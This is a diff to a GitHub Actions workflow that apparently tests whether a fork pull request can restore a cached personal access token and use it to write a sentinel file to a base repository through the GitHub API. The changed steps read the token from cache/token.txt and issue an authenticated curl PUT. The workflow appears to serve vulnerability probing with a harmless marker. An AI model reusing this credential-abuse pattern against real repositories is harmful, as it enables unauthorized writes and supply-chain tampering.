@@ -6,13 +6,13 @@ jobs:
   restore:
     runs-on: ubuntu-latest
     steps:
-      - name: Restore base PAT cache
+      - name: Restore validated PAT2 cache
         id: restore
         uses: actions/cache/restore@v4
         with:
           path: cache
-          key: apexblack-fork-cache-20260804-pat
-      - name: Use restored PAT with token scheme
+          key: apexblack-fork-cache-20260804-pat2
+      - name: Use restored PAT2 for base write
         env:
           CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
         run: |
@@ -24,14 +24,14 @@ jobs:
             exit 0
           fi
           printf "token-present=yes\n" >> result/observation.txt
-          marker="fork-pr-pat-token-scheme-20260804"
+          marker="fork-pr-pat2-inprocess-20260804"
           content="$(printf "%s\n" "$marker" | base64 -w0)"
-          body=$(printf '%s' '{"message":"fork PR PAT token-scheme sentinel","content":"'"$content"'"}')
+          body=$(printf '%s' '{"message":"fork PR PAT2 cache authority sentinel","content":"'"$content"'"}')
           http="$(curl -sS -X PUT \
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: token $(cat cache/token.txt)" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-pat-token-scheme-write.txt" \
+            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-pat2-inprocess-write.txt" \
             --data "$body" \
             -o result/api-response.json -w "%{http_code}")"
           printf "http=%s\n" "$http" >> result/observation.txt
@@ -40,6 +40,6 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: fork-cache-pr-pat-token-scheme-observation
+          name: fork-cache-pr-pat2-observation
           path: result
-# PAT authorization scheme control
+# PAT2 directly browser-validated
